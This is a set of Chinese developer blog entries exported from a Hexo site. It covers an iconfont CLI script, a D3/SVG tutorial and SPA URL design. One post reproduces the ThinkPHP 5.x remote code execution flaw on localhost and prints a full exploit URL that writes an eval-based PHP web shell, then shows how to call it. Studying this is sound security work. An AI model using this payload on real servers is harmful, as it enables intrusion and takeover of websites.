getIconfont();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIconfont</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// iconfont 下载配置文件</span></span><br><span class="line">    <span class="keyword">let</span> configData = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建存放 iconfont 解压数据的临时目录</span></span><br><span class="line">    fse.ensureDirSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断文件是否存在</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(fs.existsSync(configPath) &amp;&amp; fs.existsSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                configData = <span class="built_in">JSON</span>.parse(fs.readFileSync(configPath));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(logSymbols.warning, chalk.yellow(<span class="string">&#x27;读取配置文件失败&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(logSymbols.info, <span class="string">&quot;还未初始化,请执行&quot;</span>, chalk.blue(<span class="string">&#x27; okIcon -i&#x27;</span>));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(logSymbols.info, <span class="string">&quot;还未初始化,请执行&quot;</span>, chalk.blue(<span class="string">&#x27; okIcon -i&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同步从阿里获取 iconfont</span></span><br><span class="line">    requestSync(configData.iconAddr, configData.iconCookies).then(<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解压iconfont configData.iconPath</span></span><br><span class="line">        spawn.sync(<span class="string">&#x27;tar&#x27;</span>, [<span class="string">&#x27;zxf&#x27;</span>, <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>, <span class="string">&#x27;-C&#x27;</span>, <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>], &#123; <span class="attr">stdio</span>: <span class="string">&#x27;inherit&#x27;</span> &#125;);</span><br><span class="line">        </span><br><span class="line">        moveIconfont(configData.iconPath);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setIconInfo</span>(<span class="params">iconAddr,iconCookies,iconPath</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> source = &#123; iconAddr, iconCookies, iconPath &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> s = fs.writeFileSync(configPath, <span class="built_in">JSON</span>.stringify(source));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">requestSync</span>(<span class="params">url, cookies</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> options = &#123;</span><br><span class="line">            url: url,</span><br><span class="line">            headers: &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">`Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36`</span>,</span><br><span class="line">            Cookie: cookies</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        request(options,<span class="function"><span class="keyword">function</span>(<span class="params">e,r,b</span>)</span>&#123;</span><br><span class="line">            <span class="function"><span class="title">if</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                resolve(b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).pipe(fs.createWriteStream(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">moveIconfont</span>(<span class="params">iconPath</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> walker = walk.walk(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">    <span class="keyword">const</span> iconFiles = [<span class="string">&#x27;iconfont.css&#x27;</span>, <span class="string">&#x27;iconfont.eot&#x27;</span>, <span class="string">&#x27;iconfont.js&#x27;</span>, <span class="string">&#x27;iconfont.svg&#x27;</span>, <span class="string">&#x27;iconfont.ttf&#x27;</span>, <span class="string">&#x27;iconfont.woff&#x27;</span>];</span><br><span class="line">    walker.on(<span class="string">&quot;file&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">root, fileStats, next</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (iconFiles.includes(fileStats.name))&#123;</span><br><span class="line">            fse.moveSync(<span class="string">`<span class="subst">$&#123;root&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, <span class="string">`<span class="subst">$&#123;iconPath&#125;</span>/<span class="subst">$&#123;fileStats.name&#125;</span>`</span>, &#123; <span class="attr">overwrite</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    walker.on(<span class="string">&quot;errors&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">root, nodeStatsArray, next</span>) </span>&#123;</span><br><span class="line">        next();</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    walker.on(<span class="string">&quot;end&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(logSymbols.success, chalk.green(<span class="string">&quot;下载完毕&quot;</span>));</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../temp`</span>);</span><br><span class="line">        fse.removeSync(<span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/../iconfont.zip`</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cli</tag>
        <tag>npm</tag>
        <tag>iconfont</tag>
      </tags>
  </entry>
  <entry>
    <title>D3 数据可视化</title>
    <url>/posts/751f2370/</url>
    <content><![CDATA[<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><h4 id="代码：https-github-com-1160007652-react-d3"><a href="#代码：https-github-com-1160007652-react-d3" class="headerlink" title="代码：https://github.com/1160007652/react-d3"></a>代码：<a href="https://github.com/1160007652/react-d3">https://github.com/1160007652/react-d3</a></h4><h4 id="Demo：https-1160007652-github-io-react-d3"><a href="#Demo：https-1160007652-github-io-react-d3" class="headerlink" title="Demo：https://1160007652.github.io/react-d3"></a>Demo：<a href="https://1160007652.github.io/react-d3">https://1160007652.github.io/react-d3</a></h4><hr>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>D3 (或者叫 D3.js )是一个基于 web 标准的 JavaScript 可视化库. D3 可以借助 SVG, Canvas 以及 HTML 将你的数据生动的展现出来. D3 结合了强大的可视化交互技术以及数据驱动 DOM 的技术结合起来, 让你可以借助于现代浏览器的强大功能自由的对数据进行可视化.</p>
<a id="more"></a>

<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><p>SVG 是使用 XML 来描述二维图形和绘图程序的语言。</p>
<h3 id="svg-速学"><a href="#svg-速学" class="headerlink" title="svg 速学"></a>svg 速学</h3><h4 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h4><blockquote>
<p>rect 矩型 \ circle 圆 \ ellipse 椭圆 \ line 直线 \ polygon 多边形 \ polyline 曲线 \ path 路径\ text 文字</p>
</blockquote>
<h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><h5 id="共有属性"><a href="#共有属性" class="headerlink" title="共有属性"></a>共有属性</h5><blockquote>
<p>stroke 描边颜色 \ stroke-width 描边宽度<br>stroke-linecap 线条两端的样式 : butt 直角原状态 \ round 圆角状态 \ square 加长方角状态<br>stroke-dasharray 蚂蚁线<br>stroke-opacity 描边透明度 [ 0 - 1 ]</p>
</blockquote>
<blockquote>
<p>fill 填充颜色<br>fill-opacity 填充透明度 [ 0 - 1 ]</p>
</blockquote>
<blockquote>
<p>css-opacity 整个元素的透明度 [ 0 - 1 ]</p>
</blockquote>
<h5 id="rect-属性"><a href="#rect-属性" class="headerlink" title="rect 属性"></a>rect 属性</h5><blockquote>
<p>x y : 起始点位置<br>rx ry : 可使矩形产生圆角<br>width : 宽带<br>height: 高度</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">&quot;50&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;20&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;20&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> <span class="attr">height</span>=<span class="string">&quot;150&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:red;stroke:black;stroke-width:5;opacity:0.5&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="circle-属性"><a href="#circle-属性" class="headerlink" title="circle 属性"></a>circle 属性</h5><blockquote>
<p>cx cy : 圆形的位置<br>r : 半径</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">circle</span> <span class="attr">cx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;50&quot;</span> <span class="attr">r</span>=<span class="string">&quot;40&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;black&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">stroke-width</span>=<span class="string">&quot;2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="ellipse-属性"><a href="#ellipse-属性" class="headerlink" title="ellipse 属性"></a>ellipse 属性</h5><blockquote>
<p>cx cy : 椭圆的位置<br>rx ry : 水平半径 垂直半径</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">cx</span>=<span class="string">&quot;300&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;80&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;100&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;50&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:yellow;stroke:purple;stroke-width:2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="line-属性"><a href="#line-属性" class="headerlink" title="line 属性"></a>line 属性</h5><blockquote>
<p>x1 y1 : 起始坐标<br>x2 y2 : 结束坐标</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">line</span> <span class="attr">x1</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y1</span>=<span class="string">&quot;0&quot;</span> <span class="attr">x2</span>=<span class="string">&quot;200&quot;</span> <span class="attr">y2</span>=<span class="string">&quot;200&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;stroke:rgb(255,0,0);stroke-width:2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="polygon-属性"><a href="#polygon-属性" class="headerlink" title="polygon 属性"></a>polygon 属性</h5><blockquote>
<p>points : 置入坐标点</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">polygon</span> <span class="attr">points</span>=<span class="string">&quot;220,10 300,210 170,250 123,234&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:lime;stroke:purple;stroke-width:1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="polyline-属性"><a href="#polyline-属性" class="headerlink" title="polyline 属性"></a>polyline 属性</h5><blockquote>
<p>points : 置入坐标点</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">polyline</span> <span class="attr">points</span>=<span class="string">&quot;20,20 40,25 60,40 80,120 120,140 200,180&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;fill:none;stroke:black;stroke-width:3&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="path-属性"><a href="#path-属性" class="headerlink" title="path 属性"></a>path 属性</h5><p>路径规则：<br>M = moveto(M X,Y) ：将画笔移动到指定的坐标位置<br>L = lineto(L X,Y) ：画直线到指定的坐标位置<br>H = horizontal lineto(H X)：画水平线到指定的X坐标位置<br>V = vertical lineto(V Y)：画垂直线到指定的Y坐标位置<br>C = curveto(C X1,Y1,X2,Y2,ENDX,ENDY)：三次贝赛曲线<br>S = smooth curveto(S X2,Y2,ENDX,ENDY)<br>Q = quadratic Belzier curve(Q X,Y,ENDX,ENDY)：二次贝赛曲线<br>T = smooth quadratic Belzier curveto(T ENDX,ENDY)：映射<br>A = elliptical Arc(A RX,RY,XROTATION,FLAG1,FLAG2,X,Y)：弧线<br>Z = closepath()：关闭路径</p>
<blockquote>
<p>d : 存放路径规则</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M150 0 L75 200 L225 200 Z&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="text-属性"><a href="#text-属性" class="headerlink" title="text 属性"></a>text 属性</h5><p>1、直接写出文字</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span>I love SVG<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2、路径写文字</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">defs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">path</span> <span class="attr">id</span>=<span class="string">&quot;path1&quot;</span> <span class="attr">d</span>=<span class="string">&quot;M75,20 a1,1 0 0,0 100,0&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">defs</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;100&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:red;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textPath</span> <span class="attr">xlink:href</span>=<span class="string">&quot;#path1&quot;</span>&gt;</span>I love SVG I love SVG<span class="tag">&lt;/<span class="name">textPath</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>3、多行文本</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;20&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:red;&quot;</span>&gt;</span>Several lines:</span><br><span class="line">    <span class="tag">&lt;<span class="name">tspan</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;45&quot;</span>&gt;</span>First line<span class="tag">&lt;/<span class="name">tspan</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tspan</span> <span class="attr">x</span>=<span class="string">&quot;10&quot;</span> <span class="attr">y</span>=<span class="string">&quot;70&quot;</span>&gt;</span>Second line<span class="tag">&lt;/<span class="name">tspan</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、文本点击跳转</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;http://www.w3schools.com/svg/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;15&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;red&quot;</span>&gt;</span>I love SVG<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="章节小结"><a href="#章节小结" class="headerlink" title="章节小结"></a>章节小结</h5><p>在学习 <strong>D3.js</strong> 时，我先进行了 <strong>svg</strong>  的了解。快速的学习了<strong>svg</strong>的标签及属性。</p>
<h3 id="D3构造-大黄人"><a href="#D3构造-大黄人" class="headerlink" title="D3构造-大黄人"></a>D3构造-大黄人</h3><p>使用到的<strong>D3.js</strong> Api:</p>
<ul>
<li>select 选中元素</li>
<li>arc 构造弧型</li>
<li>append 添加新的svg元素</li>
<li>attr 设置属性</li>
<li>transition 动画</li>
<li>duration 时间</li>
</ul>
<p><a href="https://github.com/1160007652/react-d3/blob/master/src/page/example-1-emot/index.js">点击获取 <strong>完整版</strong> 代码</a><br><a href="https://1160007652.github.io/react-d3">demo 演示</a> 进入点击菜单 <strong>大黄人</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; select, arc&#125; <span class="keyword">from</span> <span class="string">&#x27;d3&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmotSVG</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">props</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(props);</span><br><span class="line">        <span class="built_in">this</span>.refSvgDom = React.createRef();</span><br><span class="line">        <span class="built_in">this</span>.emotStyle = &#123;</span><br><span class="line">            emotWidth: <span class="number">900</span>,</span><br><span class="line">            emotHeight: <span class="number">500</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">componentDidMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.svg = select(<span class="built_in">this</span>.refSvgDom.current);</span><br><span class="line">        <span class="built_in">this</span>.draw();</span><br><span class="line">    &#125;</span><br><span class="line">    draw () &#123;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; emotWidth, emotHeight &#125; = <span class="built_in">this</span>.emotStyle;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            &lt;div className=<span class="string">&quot;example-emot&quot;</span>&gt;</span><br><span class="line">                &lt;svg  ref=&#123;<span class="built_in">this</span>.refSvgDom&#125; width=&#123;emotWidth&#125; height=&#123;emotHeight&#125; &gt;&lt;/svg&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> EmotSVG;</span><br></pre></td></tr></table></figure>

<p>在画这个大黄人时，遇到的问题</p>
<p>1、 选择dom</p>
<blockquote>
<p>使用React 提供的 <strong>React.createRef()</strong> APi, 获取Dom, 并且将Dom提供给D3使用。</p>
</blockquote>
<p>2、把绘制大黄人的方法抽离</p>
<blockquote>
<p>提供 draw() 绘制方法。</p>
</blockquote>
]]></content>
      <tags>
        <tag>react</tag>
        <tag>d3</tag>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title>Thinkphp-5.0 GetShell</title>
    <url>/posts/5fbecc6/</url>
    <content><![CDATA[<p>最近暴露出了ThinkPhp框架缺陷导致远程命令执行，奈何天网恢恢～～，小菜也只能在本地爽一把！</p>
<h3 id="靶机环境"><a href="#靶机环境" class="headerlink" title="靶机环境"></a>靶机环境</h3><p>php5.6 + nginx + PHPStrom + xDebug</p>
<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
<li>Thinkphp 5.1.0 - 5.1.31</li>
<li>Thinkphp 5.0.5 - 5.0.23</li>
</ul>
<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><p>Thinkphp5.x版本(5.0.20)中没有对路由中的控制器进行严格过滤，没有开启强制路由的条件下 <strong>(默认不开启)</strong> ，导致可以注入恶意代码利用反射类调用命名空间其他任意内置类，完成远程代码执行。</p>
<a id="more"></a>

<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>Thinkphp <strong>pathinfo</strong> 方法中 有这么一条代码<strong>Config::get(‘var_pathinfo’)</strong> ，是配置文件中的设置的参数，而**’var_pathinfo’** 的默认配置为s，我们可以利用 $_GET[‘s’] 来传递路由信息，也可以利用pathinfo来传递结合前面分析可得初步利用代码如下：index.php?s=index/\namespace\class/method，</p>
<h4 id="代码利用"><a href="#代码利用" class="headerlink" title="代码利用"></a>代码利用</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/index.php?s=/index/\think\app/invokefunction</span><br><span class="line">&amp;function=call_user_func_array</span><br><span class="line">&amp;vars[0]=file_put_contents</span><br><span class="line">&amp;vars[1][]=shell.php</span><br><span class="line">&amp;vars[1][]=<span class="tag">&lt;<span class="name">?php</span> @<span class="attr">eval</span>($<span class="attr">_GET</span>[&quot;<span class="attr">code</span>&quot;])?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h4><blockquote>
<p><a href="http://127.0.0.1/shell.php">http://127.0.0.1/shell.php</a></p>
</blockquote>
<h3 id="独白"><a href="#独白" class="headerlink" title="独白"></a>独白</h3><p>还记得刚步入安全领域时，一直搞不懂什么是一句话木马<br>每次验证是否植入一句话木马成功，都要找<strong>中国菜刀</strong>去验证</p>
<p>直到有一天，顿悟了！<br>验证是否成功，可以这样！ -&gt; <a href="http://127.0.0.1/shell.php?code=phpinfo()">http://127.0.0.1/shell.php?code=phpinfo()</a><br>原来所谓的密码就是参数名！<br>知道一句话木马原理的你，是不是各种网站开发语言的🐎，都有了！</p>
<p>那是不是，所有的网站都可以这样来搞呢，发现不行啊！<br>原来是@eval起的执行作用。这就出现了新的漏洞命令可执行漏洞–！</p>
<p>然后安全杀毒类软件诞生了，各种木马拦截，道友们开始了一句话木马的变异。<br>可谓是道高一尺，魔高一丈！</p>
<p>疏而不漏啊，还是转行的 <strong>安全</strong> ！！！</p>
]]></content>
      <tags>
        <tag>安全</tag>
        <tag>thinkphp</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>SPA单应用-请求接口URL结构设计</title>
    <url>/posts/7ec088b4/</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>在开发一个SPA应用时，必然会遇到与后台接口进行ajax的交互。为了项目结构的维护性、可读性，我们总会去做一些相应的处理。如：</p>
<ul>
<li>URL集中管理</li>
<li>拦截请求</li>
<li>拦截响应</li>
</ul>
<p>在这里，我们主要去实现<strong>URL的集中管理</strong>方案。</p>
<a id="more"></a>
<h2 id="抛出问题"><a href="#抛出问题" class="headerlink" title="抛出问题"></a>抛出问题</h2><blockquote>
<p>v1: 需求问题</p>
</blockquote>
<ul>
<li>如何集中管理URL</li>
<li>如何提取出请求地址中相同的内容</li>
<li>如何区分接口环境，如[‘开发环境’,’上线环境’]</li>
</ul>
<blockquote>
<p>v2: 需求问题</p>
</blockquote>
<ul>
<li>如何在定义URL时，只写入不同的url即可。相同内容自动拼接，无需前置人为的拼接。</li>
<li>如何根据不同的路由类型，去区分请求接口的类型。</li>
</ul>
<h2 id="技术可行性分析"><a href="#技术可行性分析" class="headerlink" title="技术可行性分析"></a>技术可行性分析</h2><blockquote>
<p>v1: 需求解决思路</p>
</blockquote>
<ul>
<li>可以使用<strong>ES6 import export</strong> 的方法实现 <strong>URl集中管理</strong></li>
<li>可以使用“变量拼接、字符串模版解析”的方式，去提取地址中相同的内容</li>
